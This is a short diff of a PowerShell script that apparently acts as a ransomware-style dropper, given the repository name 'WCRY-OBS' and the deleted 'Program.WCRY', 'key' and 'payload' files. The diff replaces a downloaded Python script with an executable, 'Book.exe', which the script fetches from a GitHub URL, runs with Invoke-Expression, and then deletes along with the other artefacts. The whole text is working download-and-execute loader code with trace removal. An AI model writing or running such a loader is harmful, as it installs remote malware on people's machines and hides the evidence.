@@ -1,8 +1,9 @@
 $scriptName = $MyInvocation.MyCommand.Name
-$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Oshawott.py'
-Invoke-WebRequest -Uri $url -Outfile "Oshawott.py"
-python3 "Oshawott.py"
-Remove-Item "Oshawott.py"
+$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Book.exe'
+Invoke-WebRequest -Uri $url -Outfile "Book.exe"
+$script = "./Book.exe"
+Invoke-Expression $script
+Remove-Item "Book.exe"
 Remove-Item "key"
 Remove-Item "payload"
 Remove-Item "Program.WCRY"
